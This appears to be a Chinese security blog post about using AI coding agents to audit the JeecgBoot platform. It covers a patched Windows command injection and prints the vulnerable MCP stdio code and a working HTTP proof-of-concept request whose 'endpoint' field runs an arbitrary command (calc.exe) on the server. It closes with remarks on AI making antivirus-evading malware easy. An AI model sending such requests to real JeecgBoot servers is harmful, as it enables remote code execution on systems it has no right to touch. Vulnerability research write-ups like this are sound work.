---
title: 普通人也能通过AI几句话就来发现Github 上 46Kstar项目的命令执行漏洞来成为大黑客
url: https://mp.weixin.qq.com/s/FMR4WBic_bLvRgzn9UYiCA
source: Doonsec's feed
date: 2026-07-02
fetch_date: 2026-07-03T05:45:43.653121
---

# 普通人也能通过AI几句话就来发现Github 上 46Kstar项目的命令执行漏洞来成为大黑客

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ez2iaBVJVGbXDvBRMhXYLARusLviaITytHicGcaAicXAGGzMkI467ttzyscjkkXoptmib4RsNGBgVToDMyJGzmg4kmyYrwxsflZgdLGYB5NC6Ys4/0?wx_fmt=jpeg)

# 普通人也能通过AI几句话就来发现Github 上 46Kstar项目的命令执行漏洞来成为大黑客

原创

iceq
iceq

Ice ThirdSpace

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

01

—

**前言**

现在大模型的能力越来越强大了，网上也有很多开源的AI 代码审计平台，例如DeepAudit项目。

    无意摸鱼看到了该文章：

    https://xz.aliyun.com/news/91644

    https://xz.aliyun.com/news/91897

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbVDgSetnib5GGQcqoibMl7iaxNcuUkkian1UJQvibTycsuTDlAkwTDayibKpream0oUxD7RS5vDUOibPr5qx7Zbmm3r6FKy9dwTflmjmk/640?wx_fmt=png&from=appmsg)

文章中指出了3.8.3 版本存在 debug 远程命令执行漏洞，并给出了分析

https://github.com/jeecgboot/JeecgBoot/releases/tag/v3.8.3

    我想现在AI进步这么快，只需经过几次调教/引导应该很快能发现该类安全问题。我想如果使用专业的代码审计skill应该是能发现非常多新漏洞的，但是我想试试其他的更简单的prompt来作为本次文章的Soul Core.

02

—

**正文**

本次的流程如下：

下载源码，直接使用codex一句话直接进行代码审计，无其他的提示词

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbXwib4xKh6gFSQuOJ9yTOyPSdwx7IiaKnF1Uhqn6Mt7LI8t2eVTdeyHLTrX305oQeFPqOtIE06pchPN4O7OfZwkXYWiamSNUsg9Ek/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbXs4ial5ppaHOWWD0HXJ4kwmv8pW6982p8ECNOibvLxfOoT3tXRQEQiaibs08SD6eOzES2nc2Gs2I7OzZ8HpBib3UAq0noEJ8s9sTjI/640?wx_fmt=png&from=appmsg)

0x01 Codex得出来的结果：

AI 知识库 MinerU 文档解析 Windows 命令注入

该漏洞需要同时满足以下条件：

    1、服务运行在 Windows。

    2、jeecg.airag.know.enableMinerU=true，默认类里是 false：

  3、用户具备 AI 知识库文档导入/重建权限，如 airag:knowledge:doc:zip。

    4、上传或保存的文档类型为 pdf/doc/docx/ppt/pptx/xls/xlsx 等非 txt/md 文件。

0x02安装程序：

直接下载源码后，直接把官网的安装手册丢给他，然后让他自动安装即可

非常的好用

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbXaJHPHccPHrlHwRnsrbicuNTwDOYNhmnB5qb00SwV3Ir4hke4tibAny3ibCT2kq9DtZZrnPnztpQ80EhvDWibZJpCLFHmGN4BnGY0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbVrjh4WG5aymLOl1XXmQcQlwYZyQg7pBCA7fk57ibiaKzdz04mdct15AQL5Dqibt5AoC6e5QPeGBsvBbrPn79wyK9Lic3b8QgndZfI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbVPSkYtgk5wSnrZo6JiblVGoStYzppF4DTsq4Y4H66JZIkJr14jwGdIuazDEhjVv7p3HmC35u6qTQYxPLotSEbEymU2z5gYmAc0/640?wx_fmt=png&from=appmsg)

0x03失败的利用：

直接使用codex复现该漏洞在最新版本已经被修复

漏洞详情如下，有人提了issue

https://github.com/jeecgboot/JeecgBoot/issues/9335

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbXg4M1q7KLwwkuTFeL0ibsr8yZOqPeRibR3xNTmgECCC2O9icL5EfyJnG6cLJAcGGuzNo8fib6MwgTOSPIDibFoAmzmbVqJ2gX13uMY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbU1fB2X2T1BibXgbxODYKibyzx7Qd96Ru5Xcp10ibyQOpLdWT8dL26siaoIGstvNh9ORscRfYyGQ9MmHmwtKgySzEfLJA2TUrQ1sj8/640?wx_fmt=png&from=appmsg)

最新版本已经修复了该漏洞，在jeecg-boot-module-airag\src\main\java\org\jeecg\modules\airag\llm\handler\EmbeddingHandler.java方法下

在第 900-906 拒绝文件名含 &、|、; 等 Shell 元字符

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbUl3UY4KWozYxBxoHcG83tSLfgWTibeqZMZtVltH4N9oWiaOvicX4wIEzmyOibVia1kV5PofdLVuowMM5R1zBS2gZGysdaiaXxCfn6ZM/640?wx_fmt=png&from=appmsg)

0x04意外的发现，成功的利用：

于是我把上面的Codex利用过程直接复制粘贴到claude（配置的大模型是deepseek 4.0 flash）

很快就给我了结果，提示该版本（最新版）

/jeecgboot/airag/knowledge/doc/import/zip?knowId=2072611845298040834

/jeecgboot/airag/knowledge/doc/rebuild?docIds=2072620494183575553

这个漏洞已经被过滤了，我给你一个新的漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbUjD9oxonuzia5JdoAoOLN3GedW2v7qRLqCZcFpGdDG5KS8icmbT2ZDGgQ4Pg47W0z3I5l9OTyekuTE8szkeQsFSSCt651rDfzcw/640?wx_fmt=png&from=appmsg)

漏洞代码在：

airag\llm\controller\AiragMcpController.java

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbXM7NjH8PFvJZhaUUhEnFPh5aD7ON3owOoDYiaKJticGtiaeicKy1BJStibiaZ9M5xjwteADkO9HKVldCiagYxMJY2WA0haveMyWZMjsY/640?wx_fmt=png&from=appmsg)

——>

airag\llm\service\impl\AiragMcpServiceImpl.java

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ez2iaBVJVGbXWDEWgtV17YKI8gsS22t0wC17tsE8oEnsKSxTnM2hzDlsBpmGPbu37Bl0cfrNby8t8MQmHyWWUpibf7LshPb1LjTria700sl0pQ/640?wx_fmt=png&from=appmsg)

漏洞代码

```
                    // stdio 类型：endpoint 可能是一个命令行                    // Windows 下需要通过 cmd.exe /c 来执行命令，否则找不到 npx 等程序                    List<String> cmdParts;                    String os = System.getProperty("os.name").toLowerCase();                    if (os.contains("win")) {                        // Windows: 使用 cmd.exe /c 执行                        cmdParts = new ArrayList<>();                        cmdParts.add("cmd.exe");                        cmdParts.add("/c");                        cmdParts.add(endpoint.trim());                    } else {                        // Linux/Mac: 使用 sh -c 执行                        cmdParts = new ArrayList<>();                        cmdParts.add("sh");                        cmdParts.add("-c");                        cmdParts.add(endpoint.trim());                    }                    log.info("[MCP]执行stdio命令: {}", cmdParts);
```

所以构造出了漏洞POC

```
POST /jeecg-boot/airag/airagMcp/saveAndSync HTTP/1.1Host: 192.168.10.24:8080Content-Type: application/jsonX-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY2xpZW50VHlwZSI6IlBDIiwiZXhwIjoxNzgzMjg2MzQ2fQ.NVwpyNds4RQTk5w8whSnPzU48hcZbyRrsKrafa7C0kwContent-Length: 72

  {"name":"poc","category":"mcp","type":"stdio","endpoint":"calc.exe"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbW0Fp2ib3dAbFop9MBLef6Xg7WyTUuicDDtjfKd7U2DnDWAFreFrXcWRMVEz1ibDf6UjqpEb3BgzNeIGgHgnMOiaFf29wibnlSD9mLA/640?wx_fmt=png&from=appmsg)

目前最新版本存在\_当前最新版本： 3.9.2（2026-04-30）

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbWX0UkFWaH1IePPCXkpzyRS7ssNJGZy0FfE1Rj1qu85t5GdRicaHYfJx6j7wiaMQSeGics64d4H3uLaWVSEVrg7fXQhsg4RicutHHk/640?wx_fmt=png&from=appmsg)

03

—

**不是0day**

不过搜索关键路由，发现该漏洞已经被公开披露了

https://idocdown.com/app/articles/blogs/detail/18147

![](https://mmbiz.qpic.cn/mmbiz_png/ez2iaBVJVGbWDBPzdkAdCLCO5c4FVMQiao0Rw8M0iaOfmwChXKZBquzMKy7hEhPqGk8lfgtdEUj9QBYQBvM0oLK4buFZj39My6b4EOqibc6Ssc8/640?wx_fmt=png&from=appmsg)

总的来说，AI已经能够取代绝大部分的安全工程师的日常工作了，但是也给安全工程师带来了新的机会。因为攻击手段越来越简单，越来越多样，因此防御也变得越来越难。

之前我记得bypass一个defender要花很多时间，甚至安全工程师可能要学个半年/3个月才能bypass，但是现在可能只要1天或者半天的时间就能够写出来一个免杀的defender木马。

之前自研C2/二开是高级红队的必备技能，但是现在对于攻击选手来说，应该是随手可改，而对于防御方来说，面临的挑战则会更多。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/ZmiaibBst1BVTDLqpFDrELYqoodHk4G70BDNCCkic9H2Tofibz63VnsjibjQAL3ECwKeDRVMH8LuNzN4QA74gJVhJ0g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过